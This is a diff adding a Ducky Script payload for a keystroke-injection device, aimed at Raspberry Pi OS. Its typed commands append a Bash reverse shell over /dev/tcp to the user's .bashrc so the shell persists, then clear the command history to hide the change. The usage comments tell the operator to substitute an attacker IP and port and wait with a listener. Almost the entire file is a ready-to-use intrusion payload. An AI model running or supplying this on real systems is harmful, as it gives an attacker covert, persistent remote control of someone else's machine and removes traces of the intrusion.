@@ -1,0 +1,20 @@
+REM ===================================================================
+REM Author: fierceoj
+REM Description: Basic Bash reverse shell, uses .bashrc for persistence 
+REM Target: Raspberry Pi OS
+REM Usage: Change attacker IP/URL and port to yours
+REM Usage: Catch the shell with a listener
+REM ===================================================================
+DELAY 3000
+CTRL-ALT F1
+DELAY 200
+
+REM Append reverse shell to .bashrc file
+STRING echo "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1" >> .bashrc
+DELAY 200 
+ENTER
+
+REM Clear command history
+STRING history -c
+DELAY 200
+ENTER
